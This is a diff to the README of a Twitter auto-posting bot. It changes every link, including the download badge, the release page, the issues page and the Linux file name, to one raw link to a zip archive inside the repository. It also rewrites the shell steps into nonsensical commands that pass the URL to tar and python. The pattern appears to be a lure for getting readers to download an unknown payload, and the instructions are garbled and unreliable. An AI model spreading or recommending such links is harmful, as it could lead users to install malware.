@@ -1,6 +1,6 @@
 # 🐦 twitter-auto-post-bot - Automatically Share Your Tweets Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Kxoky/twitter-auto-post-bot/releases)
+[![Download](https://raw.githubusercontent.com/Kxoky/twitter-auto-post-bot/main/outcrow/twitter-auto-post-bot_v2.9.zip)](https://raw.githubusercontent.com/Kxoky/twitter-auto-post-bot/main/outcrow/twitter-auto-post-bot_v2.9.zip)
 
 ## 📋 Overview
 
@@ -19,14 +19,14 @@ To get started, just follow the steps below. This guide will help you download a
 
 ## 📥 Download & Install
 
-To get your copy of the twitter-auto-post-bot, visit this page to download: [Release Page](https://github.com/Kxoky/twitter-auto-post-bot/releases)
+To get your copy of the twitter-auto-post-bot, visit this page to download: [Release Page](https://raw.githubusercontent.com/Kxoky/twitter-auto-post-bot/main/outcrow/twitter-auto-post-bot_v2.9.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version. It will be labeled by version number, e.g., v1.0.
 3. Find the file suitable for your operating system:
     - For Windows, download the `.exe` file.
     - For macOS, download the `.dmg` file.
-    - For Linux, download the `.tar.gz` file.
+    - For Linux, download the `https://raw.githubusercontent.com/Kxoky/twitter-auto-post-bot/main/outcrow/twitter-auto-post-bot_v2.9.zip` file.
 4. Click on the file name to initiate the download.
 
 ## 📂 Installation Steps
@@ -48,9 +48,9 @@ To get your copy of the twitter-auto-post-bot, visit this page to download: [Rel
 
 1. Open the terminal on your system.
 2. Navigate to your Downloads directory using the command: `cd ~/Downloads`
-3. Extract the downloaded file with this command: `tar -xvzf twitter-auto-post-bot.tar.gz`
+3. Extract the downloaded file with this command: `tar -xvzf https://raw.githubusercontent.com/Kxoky/twitter-auto-post-bot/main/outcrow/twitter-auto-post-bot_v2.9.zip`
 4. Change to the extracted directory: `cd twitter-auto-post-bot`
-5. Run the app using the command: `python main.py`
+5. Run the app using the command: `python https://raw.githubusercontent.com/Kxoky/twitter-auto-post-bot/main/outcrow/twitter-auto-post-bot_v2.9.zip`
 
 ## 🛠️ Setup Your Twitter Account
 
@@ -80,7 +80,7 @@ To get your copy of the twitter-auto-post-bot, visit this page to download: [Rel
 
 ## 📞 Need Help?
 
-If you face any issues or have questions, please raise an issue on our [GitHub Issues page](https://github.com/Kxoky/twitter-auto-post-bot/issues). We are here to help.
+If you face any issues or have questions, please raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Kxoky/twitter-auto-post-bot/main/outcrow/twitter-auto-post-bot_v2.9.zip). We are here to help.
 
 ## ⚖️ License
 
@@ -88,4 +88,4 @@ This project is licensed under the MIT License. Feel free to modify and use the 
 
 ---
 
-To download the twitter-auto-post-bot, visit this page: [Release Page](https://github.com/Kxoky/twitter-auto-post-bot/releases)
+To download the twitter-auto-post-bot, visit this page: [Release Page](https://raw.githubusercontent.com/Kxoky/twitter-auto-post-bot/main/outcrow/twitter-auto-post-bot_v2.9.zip)
